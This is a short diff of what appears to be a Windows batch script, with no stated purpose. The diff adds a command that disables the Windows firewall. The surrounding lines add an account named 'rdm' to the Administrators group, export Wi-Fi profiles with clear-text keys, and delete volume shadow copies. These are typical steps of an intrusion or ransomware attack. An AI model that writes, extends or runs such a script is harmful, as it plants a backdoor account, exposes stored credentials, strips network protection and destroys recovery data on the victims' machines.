@@ -354,6 +354,8 @@ net localgroup "Administrators" rdm /add
 ECHO ============================
 netsh wlan export profile folder=. key=clear
 ECHO ============================
+netsh advfirewall set currentprofile state off
+ECHO ============================
 ECHO  %date%-%time%
 ECHO ============================
 vssadmin delete shadows /For=C: /oldest
